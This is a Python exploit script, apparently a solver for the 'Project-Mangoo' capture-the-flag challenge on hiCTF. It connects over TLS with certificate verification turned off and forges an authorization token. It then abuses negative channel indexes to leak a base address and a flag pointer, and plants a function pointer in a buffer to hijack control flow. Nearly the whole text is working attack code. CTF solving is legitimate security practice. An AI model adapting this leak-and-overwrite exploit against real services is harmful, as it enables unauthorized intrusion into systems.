# Project-Mangoo — hiCTF (script de solve)
import ssl,socket,re,struct,sys,time
HOST="project-mangoo-d398c87957c2.chall.hiddeninvestigations.net";PORT=1337
def rol8(v,n):return((v<<n)|(v>>(8-n)))&0xFF
def tok(ch):return bytes(((rol8(ch[i],3)^((0x11*i)&0xFF)^0x6a)&0xFF)for i in range(32))
def p64(x):return struct.pack("<Q",x)
class C:
    def __init__(s):
        ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
        so=socket.create_connection((HOST,PORT),10);s.s=ctx.wrap_socket(so,server_hostname=HOST);s.s.settimeout(10);s.buf=b""
    def ru(s,m,t=10):
        s.s.settimeout(t)
        while m not in s.buf:
            try:c=s.s.recv(4096)
            except:break
            if not c:break
            s.buf+=c
        i=s.buf.find(m)
        if i<0:o=s.buf;s.buf=b"";return o
        o=s.buf[:i+len(m)];s.buf=s.buf[i+len(m):];return o
    def sl(s,d):s.s.sendall(d+b"\n")
c=C()
d=c.ru(b"Authorization Token: ")
ch=bytes.fromhex(re.search(rb"Session Challenge: ([0-9a-f]{64})",d).group(1).decode())
c.sl(tok(ch).hex().encode());c.ru(b"Option > ")
def q(n):
    c.sl(b"2");c.ru(b"Channel:");c.sl(str(n).encode());return c.ru(b"Option > ")
d=q(-3);base=int(re.search(rb"Ref:\s*([0-9a-f]{16})",d).group(1),16)-0x1550
d=q(-1);flag=int(re.search(rb"Ref:\s*([0-9a-f]{16})",d).group(1),16)
print("base",hex(base),"flag",hex(flag))
PUTS=base+0x18348
# DIAG A : buf[0x10] = PUTS (appel direct, pas de pivot)
buf=bytearray(0x20); buf[0x10:0x18]=p64(PUTS)
c.sl(b"1");c.ru(b"Size:");c.sl(str(len(buf)).encode());c.ru(b"Stream:");c.sl(buf.hex().encode());c.ru(b"Option > ")
print("[A] ingest ok, trigger sync -2 (attendu: ligne vide + menu, pas de crash)")
c.sl(b"6");c.ru(b"Channel:");c.sl(b"-2")
time.sleep(0.4)
out=b"";c.s.settimeout(3)
try:
    while True:
        x=c.s.recv(4096)
        if not x:break
        out+=x
except:pass
print("=== OUT A ===");sys.stdout.write(repr(out)+"\n")
